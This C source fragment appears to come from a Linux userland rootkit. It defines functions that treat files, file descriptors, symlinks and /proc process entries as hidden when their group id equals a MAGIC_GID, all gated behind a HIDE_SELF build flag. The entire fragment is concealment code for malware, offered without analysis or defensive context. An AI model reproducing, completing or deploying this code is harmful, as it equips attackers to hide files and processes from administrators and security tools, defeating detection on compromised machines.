int _hidden_path(const char *pathname, int mode)
{
#ifndef HIDE_SELF
    return 0;
#endif

    if(mode == MODE_REG) { if(get_path_gid(pathname) == MAGIC_GID) return 1; }
    else if(mode == MODE_64) { if(get_path_gid64(pathname) == MAGIC_GID) return 1; }
    return 0;
}

int _f_hidden_path(int fd, int mode)
{
#ifndef HIDE_SELF
    return 0;
#endif

    if(mode == MODE_REG) { if(get_fd_gid(fd) == MAGIC_GID) return 1; }
    else if(mode == MODE_64) { if(get_fd_gid64(fd) == MAGIC_GID) return 1; }
    return 0;
}

int _l_hidden_path(const char *pathname, int mode)
{
#ifndef HIDE_SELF
    return 0;
#endif

    if(mode == MODE_REG) { if(lget_path_gid(pathname) == MAGIC_GID) return 1; }
    else if(mode == MODE_64) { if(lget_path_gid64(pathname) == MAGIC_GID) return 1; }
    return 0;
}

int hidden_proc(pid_t pid)
{
#ifndef HIDE_SELF
    return 0;
#endif

    char proc_path[PATH_MAX];
    (void)snprintf(proc_path, sizeof(proc_path) - 1, "/proc/%d", pid);
    return _hidden_path(proc_path, 32);
}